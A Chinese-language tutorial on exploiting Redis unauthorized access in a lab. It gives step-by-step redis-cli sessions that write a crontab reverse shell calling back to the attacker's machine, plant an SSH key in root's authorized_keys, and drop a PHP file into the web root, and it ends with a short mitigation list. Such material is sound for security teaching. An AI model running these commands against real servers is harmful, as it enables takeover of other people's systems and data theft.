# Redis未授权访问漏洞

## 介绍
Redis是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。从2010年3月15日起，Redis的开发工作由VMware主持。从2013年5月开始，Redis的开发由Pivotal赞助。

Redis因配置不当可以导致未授权访问，被攻击者恶意利用。当前流行的针对Redis未授权访问的一种新型攻击方式，在特定条件下，如果Redis以root身份运行，黑客可以给root账户写入SSH公钥文件，直接通过SSH登录受害服务器，可导致服务器权限被获取和数据删除、泄露或加密勒索事件发生，严重危害业务正常服务。　　

部分服务器上的Redis 绑定在 0.0.0.0:6379，并且没有开启认证（这是Redis 的默认配置），以及该端口可以通过公网直接访问，如果没有采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，将会导致 Redis 服务直接暴露在公网上，可能造成其他用户可以直接在非授权情况下直接访问Redis服务并进行相关操作。

## 基础操作
1、配置文件redis.conf \
redis在开放往外网的情况下(默认配置是bind 127.0.0.1，只允许本地访问，如果配置了其他网卡地址那么就可以网络访问)，默认配置下是空口令，端口为6379。这里需要将它（bind 127.0.0.1）注释掉。

版本较高的redis还要将 protected-mode设为no \
redis3.2版本后新增protected-mode配置，默认是yes，即开启，需配置bind ip或者设置访问密码。关闭时，外部网络可以直接访问

2、命令
连接redis：redis-cli -h ip \
查看redis版本信息、一些具体信息、服务器版本信息等等：info \
设置变量x：set x "test" \
整个redis数据库删除：flushall \
查看所有键：KEYS * \
获取默认的redis目录、和rdb文件名：可以在修改前先获取，然后走的时候再恢复。：CONFIG GET dir、CONFIG GET dbfilename \

## 利用
Redis未授权访问漏洞的利用方式网上很多，大多是三种方式

1、利用计划任务执行命令反弹shell

redis以root权限运行时可以写crontab来执行命令反弹shell\
现在自己的机子上监听端口：nc -lvp 7999

```
root@kali:~# redis-cli -h 192.168.63.130
192.168.63.130:6379> set x "\n* * * * * bash -i >& /dev/tcp/你机子ip/7999 0>&1\n"
OK
192.168.63.130:6379> config set dir /var/spool/cron/
OK
192.168.63.130:6379> config set dbfilename root
OK
192.168.63.130:6379> save
OK
```

2、写ssh-keygen公钥然后使用私钥登陆

同样redis要以root权限，并且服务器开放了SSH服务，允许密钥登录
本地生成密钥对：ssh-keygen -t rsa

```
192.168.63.130:6379> config set dir /root/.ssh/
OK
192.168.63.130:6379> config set dbfilename authorized_keys
OK
192.168.63.130:6379> set x "\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDKfxu58CbSzYFgd4BOjUyNSpbgpkzBHrEwH2/XD7rvaLFUzBIsciw9QoMS2ZPCbjO0IZL50Rro1478kguUuvQrv/RE/eHYgoav/k6OeyFtNQE4LYy5lezmOFKviUGgWtUrra407cGLgeorsAykL+lLExfaaG/d4TwrIj1sRz4/GeiWG6BZ8uQND9G+Vqbx/+zi3tRAz2PWBb45UXATQPvglwaNpGXVpI0dxV3j+kiaFyqjHAv541b/ElEdiaSadPjuW6iNGCRaTLHsQNToDgu92oAE2MLaEmOWuQz1gi90o6W1WfZfzmS8OJHX/GJBXAMgEgJhXRy2eRhSpbxaIVgx root@kali\n\n\n"
OK
192.168.63.130:6379> save
OK
```

3、往web物理路径写webshell

redis权限不高时，并且服务器开着web服务，在redis有web目录写权限时,可以往web路径写shell

```
192.168.63.130:6379> config set dir /var/www/html/
OK
192.168.63.130:6379> config set dbfilename shell.php
OK
192.168.63.130:6379> set x "<?php phpinfo();?>"
OK
192.168.63.130:6379> save
OK
```

## 防范
限制登录ip
添加密码
修改默认端口